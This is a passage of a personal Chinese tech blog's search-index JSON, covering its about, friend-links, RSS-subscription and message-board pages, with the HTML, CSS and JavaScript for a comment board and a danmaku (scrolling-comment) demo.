engine的壁纸问题，具体原因不清楚，有大佬怀疑壁纸随音乐律动模块把媒体控件拉过来了\n反思：一开始一个个关闭桌面美化软件来确定问题来源时，漏了壁纸\n****","categories":["存档"]},{"title":"关于笔者","url":"/about/index.html","content":"\n## 作者联系方式\n- 邮箱：yluo3383@gmail.com\n\n## 关于本站\n- 框架：Hexo + GitHub + Butterfly\n\n如果你对本站有任何建议或发现链接失效、内容问题，欢迎在评论区留言或通过邮箱联系我。谢谢来访！\n"},{"title":"categories","url":"/categories/index.html"},{"title":"tags","url":"/tags/index.html"},{"url":"/html/try.html","content":"<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>留言板 - 弹幕互动</title>\n    <link rel=\"stylesheet\" href=\"comments.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"header\">\n            <h1>💬 留言板 & 弹幕互动</h1>\n            <p>留下您的想法，参与实时弹幕互动</p>\n        </div>\n        \n        <div class=\"content\">\n            <!-- 留言板区域 -->\n            <div class=\"comments-section\">\n                <div class=\"comment-form\">\n                    <h3>发表留言</h3>\n                    <form id=\"commentForm\">\n                        <div class=\"form-group\">\n                            <label for=\"name\">昵称</label>\n                            <input type=\"text\" id=\"name\" placeholder=\"请输入您的昵称\" required>\n                        </div>\n                        <div class=\"form-group\">\n                            <label for=\"email\">邮箱</label>\n                            <input type=\"email\" id=\"email\" placeholder=\"请输入您的邮箱\">\n                        </div>\n                        <div class=\"form-group\">\n                            <label for=\"message\">留言内容</label>\n                            <textarea id=\"message\" rows=\"4\" placeholder=\"请输入您的留言...\" required></textarea>\n                        </div>\n                        <button type=\"submit\" class=\"submit-btn\">发布留言</button>\n                    </form>\n                </div>\n                \n                <div class=\"comments-list\" id=\"commentsList\">\n                    <!-- 留言列表将通过 JavaScript 动态生成 -->\n                </div>\n            </div>\n            \n            <!-- 弹幕区域 -->\n            <div class=\"danmaku-section\">\n                <canvas id=\"danmakuCanvas\"></canvas>\n                <div class=\"danmaku-controls\">\n                    <div class=\"danmaku-input\">\n                        <input type=\"text\" id=\"danmakuInput\" placeholder=\"输入弹幕内容...\" maxlength=\"30\">\n                        <button class=\"danmaku-send\" onclick=\"sendDanmaku()\">发射</button>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>\n\n    <script src=\"comments.js\"></script>\n</body>\n</html>"},{"title":"友链","url":"/links/index.html","content":"\n欢迎交换友链，请将头像、昵称、希望出现的介绍信息发送至我的邮箱yluo3383@gmail.com(▰˘◡˘▰)\n"},{"title":"订阅RSS","url":"/subscribe/index.html","content":"\n欢迎订阅本站更新。你可以通过下方按钮直接订阅 RSS：\n\n<div class=\"container\">\n  <div class=\"btn-center\">\n    <a class=\"btn-beautify blue larger\" href=\"/atom.xml\" target=\"_blank\" rel=\"noopener\">\n      <i class=\"fas fa-rss\"></i>\n      <span>订阅 RSS（Atom）</span>\n    </a>\n  </div>\n</div>\n\n<div class=\"container\">\n  <div class=\"btn-center\">\n    <a class=\"btn-beautify orange larger\" href=\"/rss.xml\" target=\"_blank\" rel=\"noopener\">\n      <i class=\"fas fa-rss\"></i>\n      <span>订阅 RSS（RSS2）</span>\n    </a>\n  </div>\n</div>\n\n按钮后页面报错暂时无解但使用正常故暂时搁置，下方教程可以订阅（如有大佬可留言板或邮箱指点感激不尽）\n如果你使用的是 `RSS` 阅读器（推荐 Inoreader），可以直接将本站的订阅源地址添加到阅读器：\n\n订阅教程（任选一种方式）：\n\n1) 使用 Inoreader 订阅\n- 打开 `https://www.innoreader.com/login` 并登录。\n- 点击“订阅”，输入 `https://luoyinhui.github.io/atom.xml` 或 `https://luoyinhui.github.io/rss.xml`。\n- 确认添加后即可在侧边栏看到更新。\n\n1) 使用桌面/移动端 RSS 客户端\n- 将 `https://luoyinhui.github.io/atom.xml` 或 `https://luoyinhui.github.io/rss.xml` 粘贴到客户端的“添加订阅”入口。\n- 常见客户端：NetNewsWire（macOS/iOS）、Read You（Android）、Reeder（macOS/iOS）等。\n\n如果打开 `atom.xml` 或 `rss.xml` 提示不存在，请联系站长或稍后再试。\n"},{"title":"留言板","url":"/try/index.html","content":"\n<link rel=\"stylesheet\" href=\"/comments/comments.css\">\n\n<div class=\"container\">\n    <!-- 这里粘贴上面的HTML内容 -->\n    <!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>留言板 - 弹幕互动</title>\n    <link rel=\"stylesheet\" href=\"comments.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"header\">\n            <h1>💬 留言板 & 弹幕互动</h1>\n            <p>留下您的想法，参与实时弹幕互动</p>\n        </div>\n        \n        <div class=\"content\">\n            <!-- 留言板区域 -->\n            <div class=\"comments-section\">\n                <div class=\"comment-form\">\n                    <h3>发表留言</h3>\n                    <form id=\"commentForm\">\n                        <div class=\"form-group\">\n                            <label for=\"name\">昵称</label>\n                            <input type=\"text\" id=\"name\" placeholder=\"请输入您的昵称\" required>\n                        </div>\n                        <div class=\"form-group\">\n                            <label for=\"email\">邮箱</label>\n                            <input type=\"email\" id=\"email\" placeholder=\"请输入您的邮箱\">\n                        </div>\n                        <div class=\"form-group\">\n                            <label for=\"message\">留言内容</label>\n                            <textarea id=\"message\" rows=\"4\" placeholder=\"请输入您的留言...\" required></textarea>\n                        </div>\n                        <button type=\"submit\" class=\"submit-btn\">发布留言</button>\n                    </form>\n                </div>\n                \n                <div class=\"comments-list\" id=\"commentsList\">\n                    <!-- 留言列表将通过 JavaScript 动态生成 -->\n                </div>\n            </div>\n            \n            <!-- 弹幕区域 -->\n            <div class=\"danmaku-section\">\n                <canvas id=\"danmakuCanvas\"></canvas>\n                <div class=\"danmaku-controls\">\n                    <div class=\"danmaku-input\">\n                        <input type=\"text\" id=\"danmakuInput\" placeholder=\"输入弹幕内容...\" maxlength=\"30\">\n                        <button class=\"danmaku-send\" onclick=\"sendDanmaku()\">发射</button>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>\n\n    <script src=\"comments.js\"></script>\n</body>\n</html>\n</div>\n\n<script src=\"/comments/comments.js\"></script>"},{"url":"/html/css/try.css","content":"* {\n    margin: 0;\n    padding: 0;\n    box-sizing: border-box;\n}\n\nbody {\n    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n    min-height: 100vh;\n    padding: 20px;\n}\n\n.container {\n    max-width: 1200px;\n    margin: 0 auto;\n    background: rgba(255, 255, 255, 0.95);\n    border-radius: 20px;\n    overflow: hidden;\n    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);\n}\n\n.header {\n    background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);\n    color: white;\n    padding: 40px;\n    text-align: center;\n}\n\n.header h1 {\n    font-size: 2.5rem;\n    margin-bottom: 10px;\n}\n\n.header p {\n    font-size: 1.2rem;\n    opacity: 0.9;\n}\n\n.content {\n    display: grid;\n    grid-template-columns: 1fr 1fr;\n    gap: 0;\n    min-height: 600px;\n}\n\n/* 留言板样式 */\n.comments-section {\n    padding: 30px;\n    background: white;\n    border-right: 1px solid #eee;\n}\n\n.comment-form {\n    background: #f8f9fa;\n    padding: 20px;\n    border-radius: 15px;\n    margin-bottom: 30px;\n}\n\n.form-group {\n    margin-bottom: 15px;\n}\n\n.form-group label {\n    display: block;\n    margin-bottom: 5px;\n    font-weight: 600;\n    color: #333;\n}\n\n.form-group input,\n.form-group textarea {\n    width: 100%;\n    padding: 12px;\n    border: 2px solid #e9ecef;\n    border-radius: 8px;\n    font-size: 14px;\n    transition: border-color 0.3s;\n}\n\n.form-group input:focus,\n.form-group textarea:focus {\n    outline: none;\n    border-color: #4facfe;\n}\n\n.submit-btn {\n    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n    color: white;\n    border: none;\n    padding: 12px 30px;\n    border-radius: 25px;\n    cursor: pointer;\n    font-size: 16px;\n    font-weight: 600;\n    transition: transform 0.3s;\n}\n\n.submit-btn:hover {\n    transform: translateY(-2px);\n}\n\n.comments-list {\n    max-height: 400px;\n    overflow-y: auto;\n}\n\n.comment-item {\n    background: white;\n    padding: 15px;\n    margin-bottom: 15px;\n    border-radius: 10px;\n    border-left: 4px solid #4facfe;\n    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);\n}\n\n.comment-header {\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n    margin-bottom: 8px;\n}\n\n.comment-author {\n    font-weight: bold;\n    color: #333;\n}\n\n.comment-time {\n    color: #666;\n    font-size: 12px;\n}\n\n.comment-content {\n    color: #555;\n    line-height: 1.5;\n}\n\n/* 弹幕区域样式 */\n.danmaku-section {\n    position: relative;\n    background: #1a1a1a;\n    overflow: hidden;\n}\n\n#danmakuCanvas {\n    position: absolute;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n}\n\n.danmaku-controls {\n    position: absolute;\n    bottom: 20px;\n    left: 0;\n    right: 0;\n    padding: 0 20px;\n    z-index: 10;\n}\n\n.danmaku-input {\n    display: flex;\n    gap: 10px;\n}\n\n.danmaku-input input {\n    flex: 1;\n    padding: 12px;\n    border: none;\n    border-radius: 25px;\n    background: rgba(255, 255, 255, 0.9);\n}\n\n.danmaku-send {\n    background: #ff4757;\n    color: white;\n    border: none;\n    padding: 12px 20px;\n    border-radius: 25px;\n    cursor: pointer;\n    font-weight: 600;\n}\n\n/* 响应式设计 */\n@media (max-width: 768px) {\n    .content {\n        grid-template-columns: 1fr;\n    }\n    \n    .comments-section {\n        border-right: none;\n        border-bottom: 1px solid #eee;\n    }\n    \n    .header h1 {\n        font-size: 2rem;\n    }\n    \n    .header {\n        padding: 30px 20px;\n    }\n}"},{"title":"留言板","url":"/messageboard/index.html","content":"\n<div class=\"msgboard\">\n  <h2>最新评论（全站）</h2>\n  <div id=\"recent-comments\" class=\"recent-comments\"></div>\n  <div class=\"recent-actions\"><button id=\"load-more\" class=\"load-more\">加载更多</button></div>\n  <div id=\"twikoo-wrap\" class=\"twikoo-wrap\"></div>\n</div>\n\n<style>\n.msgboard { padding: 12px; }\n.recent-comments { max-height: 420px; overflow-y: auto; padding-right: 8px; }\n.tk-comment { display: flex; gap: 12px; padding: 10px 0; border-bottom: 1px dashed var(--text-color, #999); }\n.tk-avatar { width: 40px; height: 40px; flex: 0 0 40px; border-radius: 50%; overflow: hidden; }\n.tk-avatar img { width: 100%; height: 100%; object-fit: cover; }\n.tk-main { flex: 1 1 auto; }\n.tk-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }\n.tk-nick { font-weight: 600; line-height: 1.4; }\n.tk-content { line-height: 1.6; word-break: break-word; }\n.tk-footer { display: flex; justify-content: flex-end; align-items: center; gap: 10px; margin-top: 6px; color: var(--text-color, #666); font-size: 0.9em; }\n.tk-footer .tk-time { opacity: 0.85; }\n.tk-footer .tk-link { text-decoration: none; }\n.recent-actions { display: flex; justify-content: flex-end; margin-top: 6px; }\n.load-more { display: inline-block; padding: 4px 10px; font-size: 0.85em; border: 1px solid var(--text-color, #999); border-radius: 4px; background: var(--card-bg, transparent); color: var(--text-color, #666); cursor: pointer; }\n.load-more:hover { background: rgba(0,0,0,0.05); }\n.load-more:disabled { opacity: 0.6; cursor: not-allowed; }\n</style>\n\n<script>\n(function(){\n  const envId = 'https://twikoo-vercel01.vercel.app';\n  const titleCache = new Map();\n  let displayedCount = 10; // 初始显示 10 条\n  let cacheList = [];      // 最近一次获取的列表缓存\n  let isLoadingMore = false;\n  let fullList = [];       // 缓存最多 50 条，供“加载更多”使用\n\n  function escapeHTML(html){\n    const div = document.createElement('div');\n    div.textContent = html == null ? '' : String(html);\n    return div.innerHTML;\n  }\n  function sanitizeContent(str){\n    if (!str) return '';\n    let s = String(str);\n    // 如果出现 <div 或 &lt;div，直接截断至该位置，后面的页面内容全部不要\n    const idxRealDiv = s.search(/<div\\b/i);\n    const idxEscDiv = s.search(/&lt;div\\b/i);\n    const cutIdx = (idxRealDiv >= 0 && idxEscDiv >= 0) ? Math.min(idxRealDiv, idxEscDiv) : (idxRealDiv >= 0 ? idxRealDiv : idxEscDiv);\n    if (cutIdx >= 0) s = s.slice(0, cutIdx);\n    // 统一换行\n    s = s.replace(/<br\\s*\\/?>(\\r\\n|\\n)?/gi, '\\n');\n    // 移除整段 div（真实标签），包含内部内容（截断后理论上不再出现，但保留以防万一）\n    s = s.replace(/<div(?:\\s[^>]*)?>[\\s\\S]*?<\\/div>/gi, '');\n    // 移除整段 div（已转义标签），包含内部内容（防御性保留）\n    s = s.replace(/&lt;div(?:\\s[^&]*)&gt;[\\s\\S]*?&lt;\\/div&gt;/gi, '');\n    // 移除常见标签本身（保留内部内容）：p/hr/span/i（真实）\n    s = s.replace(/<\\/?(p|hr|span|i)[^>]*>/gi, '');\n    // 移除其他真实 HTML 标签（保留文本）\n    s = s.replace(/<[^>]+>/g, '');\n    // 移除常见标签的已转义形式（保留内部内容）\n    s = s.replace(/&lt;\\/?(p|hr|span|i)[^&]*&gt;/gi, '');\n    // 移除其他已转义 HTML 标签\n    s = s.replace(/&lt;[^&]+&gt;/g, '');\n    // 额外移除纯文本关键词“div”（大小写不敏感，独立词）\n    s = s.replace(/\\bdiv\\b/gi, '');\n    // 转义并将换行还原为 <br>\n    return escapeHTML(s.trim()).replace(/\\n/g, '<br>');\n  }\n  function formatTime(ts){\n    try { return new Date(ts).toLocaleString(); } catch(e){ return ''; }\n  }\n  async function resolveTitle(path){\n    if (!path) return '评论位置';\n    if (titleCache.has(path)) return titleCache.get(path);\n    const url = path.startsWith('http') ? path : (location.origin + path);\n    try {\n      const resp = await fetch(url, { credentials: 'omit' });\n      const html = await resp.text();\n      const m = html.match(/<title>(.*?)<\\/title>/i);\n      let title = m ? m[1].trim() : '评论位置';\n      title = title.replace(/\\s*\\|\\s*[^|]+$/, '');\n      titleCache.set(path, title);\n      return title;\n    } catch(e){\n      titleCache.set(path, '评论位置');\n      return '评论位置';\n    }\n  }\n\n  function render(items){\n    const container = document.getElementById('recent-comments');\n    if (!container) return;\n    const frag = document.createDocumentFragment();\n    items.forEach(e => {\n      const linkUrl = (e && e.url) ? (e.url + (e.id ? ('#' + e.id) : '')) : '#';\n      const wrapper = document.createElement('div');\n      wrapper.className = 'tk-comment';\n      wrapper.innerHTML = `\n        <div class=\\\"tk-avatar\\\">\\n          <img src=\\\"${escapeHTML(e.avatar || '')}\\\" alt=\\\"avatar\\\">\\n        </div>\\n        <div class=\\\"tk-main\\\">\\n          <div class=\\\"tk-header\\\">\\n            <span class=\\\"tk-nick\\\">${escapeHTML(e.nick || '匿名')}</span>\\n          </div>\\n          <div class=\\\"tk-content\\\">${sanitizeContent(e.comment)}</div>\\n          <div class=\\\"tk-footer\\\">\\n            <span class=\\\"tk-time\\\">${formatTime(e.created)}</span>\\n            <a class=\\\"tk-link\\\" href=\\\"${escapeHTML(linkUrl)}\\\" target=\\\"_blank\\\">评论位置</a>\\n          </div>\\n        </div>`;\n      frag.appendChild(wrapper);\n      resolveTitle(e.url).then(title => {\n        const a = wrapper.querySelector('.tk-link');\n        if (a) a.textContent = title || '评论位置';\n      });\n    });\n    container.innerHTML = '';\n    container.appendChild(frag);\n  }\n\n  async function refresh(){\n    try {\n      const Twikoo = window.twikoo;\n      if (!Twikoo || !Twikoo.getRecentComments) return;\n      // 拉取更多（最多 50 条），前端仅显示 displayedCount 条\n      const res = await Twikoo.getRecentComments({ envId, pageSize: 50 });\n      const list = (res || []).map(e => ({\n        avatar: e.avatar,\n        nick: e.nick,\n        comment: e.comment,\n        url: e.url,\n        id: e.id,\n        created: e.created\n      }));\n      fullList = list;\n      const countToShow = Math.min(displayedCount, fullList.length);\n      const container = document.getElementById('recent-comments');\n      const prevTop = container ? container.scrollTop : 0;\n      render(fullList.slice(0, countToShow));\n      if (container) container.scrollTop = prevTop;\n      updateLoadMoreState(displayedCount < fullList.length);\n    } catch(err){\n      console.warn('获取最新评论失败', err);\n    }\n  }\n\n  // 首次加载：等待 Twikoo 脚本就绪再刷新\n  const waitTwikoo = setInterval(() => {\n    if (window.twikoo && window.twikoo.getRecentComments) {\n      clearInterval(waitTwikoo);\n      refresh();\n    }\n  }, 500);\n\n  // 评论提交后 3 秒刷新：兼容按钮 id/class 两种情况\n  document.addEventListener('click', (e) => {\n    const t = e.target;\n    if (!t) return;\n    if (t.id === 'tk-submit' || t.classList.contains('tk-submit')) {\n      setTimeout(refresh, 3000);\n    }\n  });\n\n  // 轮询刷新，保持滚动区最新（保留当前滚动位置）\n  setInterval(async () => {\n    const c = document.getElementById('recent-comments');\n    const top = c ? c.scrollTop : 0;\n    await refresh();\n    if (c) c.scrollTop = top;\n  }, 10000);\n\n  // 加载更多（每次再显示 10 条更早的评论，使用 fullList，无需二次请求）\n  const loadMoreBtn = document.getElementById('load-more');\n  function updateLoadMoreState(hasMore){\n    if (!loadMoreBtn) return;\n    loadMoreBtn.disabled = !hasMore;\n    loadMoreBtn.textContent = hasMore ? '加载更多' : '没有更多了';\n  }\n  if (loadMoreBtn) {\n    loadMoreBtn.addEventListener('click', async () => {\n      if (isLoadingMore) return;\n      isLoadingMore = true;\n      try {\n        const newCount = Math.min(displayedCount + 10, fullList.length);\n        if (newCount === displayedCount) {\n          updateLoadMoreState(false);\n        } else {\n          const c = document.getElementById('recent-comments');\n          const top = c ? c.scrollTop : 0;\n          displayedCount = newCount;\n          render(fullList.slice(0, displayedCount));\n          if (c) c.scrollTop = top;\n          updateLoadMoreState(displayedCount < fullList.length);\n        }\n      } catch(err) {\n        console.warn('加载更多失败', err);\n      } finally {\n        isLoadingMore = false;\n      }\n    });\n  }\n})();\n</script>\n\n<p style=\"margin-top:16px; font-weight: 600;\">欢迎留言交流~ 下方可直接评论，提交后会显示在上方“最新评论”里。</p>"},{"url":"/html/js/try.js","content":"// 留言板功能\nconst commentForm = document.getElementById('commentForm');\nconst commentsList = document.getElementById('commentsList');\n\n// 从 localStorage 加载留言\nfunction loadComments() {\n    const comments = JSON.parse(localStorage.getItem('comments')) || [];\n    commentsList.innerHTML = '';\n    \n    comments.forEach(comment => {\n        const commentElement = document.createElement('div');\n        commentElement.className = 'comment-item';\n        commentElement.innerHTML = `\n            <div class=\"comment-header\">\n                <span class=\"comment-author\">${comment.name}</span>\n                <span class=\"comment-time\">${comment.time}</span>\n            </div>\n            <div class=\"comment-content\">${comment.message}</div>\n        `;\n        commentsList.appendChild(commentElement);\n    });\n}\n\n// 提交留言\ncommentForm.addEventListener('submit', function(e) {\n    e.preventDefault();\n    \n    const name = document.getElementById('name').value;\n    const email = document.getElementById('email').value;\n    const message = document.getElementById('message').value;\n    \n    const comment = {\n        name: name,\n        email: email,\n        message: message,\n        time: new Date().toLocaleString('zh-CN')\n    };\n    \n    // 保存到 localStorage\n    const comments = JSON.parse(localStorage.getItem('comments')) || [];\n    comments.unshift(comment);\n    localStorage.setItem('comments', JSON.stringify(comments));\n    \n    // 清空表单\n    commentForm.reset();\n    \n    // 重新加载留言\n    loadComments();\n    \n    // 同时发送弹幕\n    sendDanmaku(message, name);\n});\n\n// 弹幕功能\nconst canvas = document.getElementById('danmakuCanvas');\nconst ctx = canvas.getContext('2d');\nlet danmakus = [];\n\n// 初始化画布\nfunction initCanvas() {\n    canvas.width = canvas.offsetWidth;\n    canvas.height = canvas.offsetHeight;\n}\n\n// 弹幕类\nclass Danmaku {\n    constructor(text, color = '#fff') {\n        this.text = text;\n        this.color = color;\n        this.x = canvas.width;\n        this.y = Math.random() * (canvas.height - 50) + 25;\n        this.speed = 2 + Math.random() * 2;\n        this.opacity = 1;\n        this.fontSize = 18 + Math.random() * 10;\n    }\n    \n    update() {\n        this.x -= this.speed;\n        return this.x > -200;\n    }\n    \n    draw() {\n        ctx.save();\n        ctx.globalAlpha = this.opacity;\n        ctx.font = `bold ${this.fontSize}px Arial`;\n        ctx.fillStyle = this.color;\n        ctx.fillText(this.text, this.x, this.y);\n        \n        // 添加文字阴影\n        ctx.shadowColor = 'rgba(0, 0, 0, 0.8)';\n        ctx.shadowBlur = 10;\n        ctx.shadowOffsetX = 2;\n        ctx.shadowOffsetY = 2;\n        ctx.restore();\n    }\n}\n\n// 发送弹幕\nfunction sendDanmaku(text = null, author = null) {\n    const input = document.getElementById('danmakuInput');\n    const danmakuText = text || input.value;\n    \n    if (danmakuText.trim()) {\n        const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57', '#ff9ff3'];\n        const color = colors[Math.floor(Math.random() * colors.length)];\n        \n        let displayText = danmakuText;\n        if (author && !text) {\n            displayText = `${author}: ${danmakuText}`;\n        }\n        \n        danmakus.push(new Danmaku(displayText, color));\n        \n        if (!text) {\n            input.value = '';\n        }\n    }\n}\n\n// 动画循环\nfunction animate() {\n    ctx.clearRect(0, 0, canvas.width, canvas.height);\n    \n    // 更新和绘制所有弹幕\n    danmakus = danmakus.filter(danmaku => danmaku.update());\n    danmakus.forEach(danmaku => danmaku.draw());\n    \n    requestAnimationFrame(animate);\n}\n\n// 初始化\nwindow.addEventListener('load', function() {\n    initCanvas();\n    loadComments();\n    animate();\n    \n    // 添加一些示例弹幕\n    setTimeout(() => {\n        sendDanmaku('欢迎来到留言板！');\n        sendDanmaku('这个页面真不错~');\n        sendDanmaku('大家快来留言呀！');\n        sendDanmaku('弹幕效果很酷！');\n        sendDanmaku('支持实时互动！');\n    }, 1000);\n});\n\nwindow.addEventListener('resize', initCanvas);\n\n// 回车发送弹幕\ndocument.getElementById('danmakuInput').addEventListener('keypress', function(e) {\n    if (e.key === 'Enter') {\n        sendDanmaku();\n    }\n});\n\n// 添加随机弹幕生成（可选）\nsetInterval(() => {\n    const randomMessages = [\n        '这个留言板很棒！',\n        '弹幕效果很流畅',\n        '界面设计很漂亮',\n        '功能很实用',\n        '支持实时互动',\n        '用户体验很好'\n    ];\n    const randomMessage = randomMessages[Math.floor(Math.random() * randomMessages.length)];\n    sendDanmaku(randomMessage);\n}, 10000); // 每10秒发送一条随机弹幕"},{"url":"/img/friends/README.html","content":"将友链头像统一放在本目录。\n\n建议命名规范：\n- 使用全小写字母、数字与短横线，例如：`example.png`、`my-friend.jpg`\n- 尽量使用正方形或圆形裁剪的头像，尺寸 96x96 或 128x128\n\n使用步骤：\n1. 将图片拷贝到 `source/img/friends/` 目录\n2. 在 `source/_data/link.yml` 文件中，将 `avatar` 字段设置为 `/img/friends/图片文件名`\n3. 生成或预览站点，即可在友链页面看到头像\n\n"}]